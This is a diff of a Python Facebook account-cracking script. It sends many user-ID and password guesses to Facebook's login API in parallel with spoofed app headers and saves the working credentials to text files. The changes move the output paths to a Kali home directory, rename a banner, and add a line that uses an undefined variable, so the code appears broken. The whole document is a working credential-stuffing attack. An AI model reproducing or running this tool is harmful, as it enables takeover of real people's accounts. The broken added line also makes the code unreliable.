@@ -64,7 +64,7 @@ def auto_pass(fileeee):
     tl=str(len(fileeee))
     print("  [✓] Total id in File : "+tl)
     print(cox)
-    print("  [✓] Id Save: /sdcard/EhcEmran.txt")
+    print("  [✓] Id Save: /home/kali/EhcEmran.txt")
     print(cox)
     with ThreadPool (max_workers=120) as feel:
         for data in fileeee:
@@ -148,7 +148,7 @@ oks=[]
 
 def file_subb(uid,pwx):
     global oks,loop
-    sys.stdout.write(f"\r  \033[38;5;46m[EhcEmran] {loop}|{str(len(oks))}");sys.stdout.flush()
+    sys.stdout.write(f"\r  \033[38;5;46m[MAHID] {loop}|{str(len(oks))}");sys.stdout.flush()
     session=requests.Session()
     try:
         for ps in pwx:
@@ -191,14 +191,15 @@ def file_subb(uid,pwx):
 'X-FB-Server-Cluster': 'True',
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
             q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+            q=json.loads(p)
             if "session_key" in q:
                 print(f"\r\r  [OK] {uid} | {ps}      ")
-                open("/sdcard/EhcEmran-Ok.txt","a").write(uid+"|"+ps+"\n")
+                open("/home/kali/EhcEmran-Ok.txt","a").write(uid+"|"+ps+"\n")
                 oks.append(uid)
                 break
             elif "Please Confirm Email" in q:
                 print(f"\r\r। [OK] {uid} | {ps}      ")
-                open("/sdcard/EhcEmran-Ok.txt","a").write(uid+"|"+ps+"\n")
+                open("/home/kali/EhcEmran-Ok.txt","a").write(uid+"|"+ps+"\n")
                 oks.append(uid)
             elif "www.facebook.com" in q:
                 print(f"\r\r  [CP] {uid} | {ps}      ")
